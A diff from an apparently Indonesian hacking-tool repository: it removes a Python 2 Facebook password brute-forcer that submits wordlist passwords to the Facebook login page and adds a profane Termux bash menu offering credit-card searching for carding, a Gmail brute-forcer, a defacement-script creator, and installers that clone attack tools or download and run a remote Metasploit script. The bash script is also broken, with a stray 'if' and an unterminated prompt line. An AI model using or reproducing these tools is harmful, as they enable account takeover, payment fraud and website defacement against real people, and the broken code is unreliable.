@@ -1,120 +1,122 @@
-#!usr/bin/python
-# Attack Facebook Cracker Version 2.1 
-#Ini Aadalah Program Ilegal Jangan Di Salah Gunakan !
+#!/system/xbin/bash
+#ApaanSihTolol!
+#JanganRecodeBngst!
+#KagaAdaFaedahnyaNgeRecode!
+#MikirMakeOtakGblk!
+clear
+cd module
+python2 please.py
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+sleep 1
+echo $blue
+cat asw.txt
+echo ""
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo "\033[32;1mAuthor : CoumingX"
+echo "\033[37;1mFeat: R1V4LIZM41L"
+echo "\033[35;1mTeam : Anonymous"
+echo "\033[33;1mKontak Gua :  083814340681"
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo ""
+echo "\033[32;1mPilih Sendiri Ngentod!:)?:"
+echo "\033[36;1m"
+echo "[===============================================]>"
+echo $blue "1.> Cari CC Untuk Carding"
+echo "[===============================================]>"
+echo $yellow "2.> Install Red_Hawk"
+echo "[===============================================]>"
+echo $purple "3.> Install MetaSploit"
+echo "[===============================================]>"
+echo $cyan "4.> Install Brute Force Gmail "
+echo "[===============================================]>"
+echo $green "5.> Script Deface Creator"
+echo "[===============================================]>"
+echo $red "0.> keluar"
+echo "[+]===============================================[+]"
+echo "\033[32;1m"
+read -p "CoumingX~# vro
 
-import sys
-import random
-import mechanize
-import cookielib
-import pdb
-
-GHT = '''
-
-
-        +=======================================+
-        || Usurname : CoumingX                 ||
-        || Facebook : Oh                       ||
-        ||    -Attack Facebook Cracker-        ||
-        ||         -By Couming-                ||
-        +=======================================+
-        
-
-
-
-
-
-
-        +---------------------------------------+
-       |..........Facebook Attack By CoumingX.......|
-        +---------------------------------------+
-'''
-print "-Jagan Di Salah Gunakan Ya Ngentod !"
-print "# CTRL+C Exit Program"
-print "# Use www.graph.facebook.com" 
-
-
-email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
-passwordlist = str(raw_input("Enter the name of the password list file : "))
-
-useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-
-
-
-login = 'https://www.facebook.com/login.php?login_attempt=1'
-def attack(password):
-
-  try:
-     sys.stdout.write("\r[*] trying %s.. " % password)
-     sys.stdout.flush()
-     br.addheaders = [('User-agent', random.choice(useragents))]
-     site = br.open(login)
-     br.select_form(nr=0)
-
-      
-     ##Facebook
-     br.form['email'] =email
-     br.form['pass'] = password
-     br.submit()
-     log = br.geturl()
-     if (log != login) and (not 'login_attempt' in log):
-        pdb.set_trace()
-        print "\n\n\n [*] Password found .. !!"
-        print "\n [*] Password : %s\n" % (password)
-        sys.exit(1)
-  except KeyboardInterrupt:
-        print "\n[*] Exiting program .. "
-        sys.exit(1)
-
-def search():
-    global password
-    for password in passwords:
-        attack(password.replace("\n",""))
+if [ $vro = 1 ] || [ $vro = 1 ]
+then
+clear
+toilet "CoumingX"
+php key.php
+fi
 
 
+if [ $vro = 2 ] || [ $vro = 2 ]
+then
+clear
+toilet -f standard -F gay "CoumingX" 
+sleep 3
+apt update
+apt install git
+apt install php
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+mv RED_HAWK $HOME
+cd $HOME/RED_HAWK
+chmod +x rhawk.php
+php rhawk.php
+fi
 
-def check():
+if [ $vro = 3 ] || [ $vro = 3 ]
+then
+clear
+cowsay -f kiss.cow "CoumingX" | lolcat
+figlet "CoumingX" | lolcat
+sleep 1
+pkg install curl
+curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
+chmod +x metasploit.sh
+./metasploit.sh
+echo "\033[33;1muntuk tutorial penggunaan metasploit kunjungi:" "\033[36;1m https://www.youtube.com/playlist?list=PL4qheylYxmKwZI_XudHORnc-9bha7Y8qw"
+sleep 5
+mv metasploit-framework $HOME
+cd $HOME/metasploit-framework
+./msfconsole
+fi
 
-    global br
-    global passwords
-    try:
-       br = mechanize.Browser()
-       cj = cookielib.LWPCookieJar()
-       br.set_handle_robots(False)
-       br.set_handle_equiv(True)
-       br.set_handle_referer(True)
-       br.set_handle_redirect(True)
-       br.set_cookiejar(cj)
-       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-    except KeyboardInterrupt:
-       print "\n[*] Exiting program ..\n"
-       sys.exit(1)
-    try:
-       list = open(passwordlist, "r")
-       passwords = list.readlines()
-       k = 0
-       while k < len(passwords):
-          passwords[k] = passwords[k].strip()
-          k += 1
-    except IOError:
-        print "\n [*] Error: check your password list path \n"
-        sys.exit(1)
-    except KeyboardInterrupt:
-        print "\n [*] Exiting program ..\n"
-        sys.exit(1)
-    try:
-        print GHT
-        print " [*] Account to crack : %s" % (email)
-        print " [*] Loaded :" , len(passwords), "passwords"
-        print " [*] Cracking, please wait ..."
-    except KeyboardInterrupt:
-        print "\n [*] Exiting program ..\n"
-        sys.exit(1)
-    try:
-        search()
-        attack(password)
-    except KeyboardInterrupt:
-        print "\n [*] Exiting program ..\n"
-        sys.exit(1)
+if [ $vro = 4 ] || [ $vro = 4 ]
+then
+clear
+toilet -f big -F gay "CoumingX"
+sleep 1
+apt update && apt upgrade
+apt install git
+git clone https://github.com/JamesAndresCM/Brute_force_gmail
+mv Brute_force_gmail $HOME
+cd $HOME/Brute_force_gmail
+ls
+if
 
-if __name__ == '__main__':
-    check()
+
+if [ $vro = 5 ] || [ $vro = 5 ]
+then
+clear
+toilet "CoumingX"
+python2 create.py
+fi
+
+if [ $vro = 0 ] || [ $vro = 00 ]
+then
+echo "\033[32;Im Anonymous"
+sleep 1
+echo " We Are Legion"
+sleep 1
+echo "We Dont Forget"
+sleep 1
+echo "We Dont Forgive"
+sleep 1
+echo "\033[32;Terima Kasih:)"
+sleep 1
+exit
+fi
+
+
+
